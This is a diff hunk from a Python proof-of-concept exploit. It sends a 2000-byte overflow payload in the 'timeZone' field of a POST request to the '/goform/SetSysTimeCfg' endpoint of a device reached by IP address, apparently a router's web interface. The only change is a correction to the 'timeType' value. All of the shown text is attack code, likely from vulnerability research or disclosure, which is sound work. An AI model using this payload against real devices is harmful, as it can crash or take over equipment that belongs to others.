@@ -27,7 +27,7 @@ url = "http://" + ip + "/goform/SetSysTimeCfg"
 payload = b"a"*2000
 
 data = {
-        'timeType':'sy',
+        'timeType':'sync',
         'timeZone':payload,
     }
 response = requests.post(url, data=data)
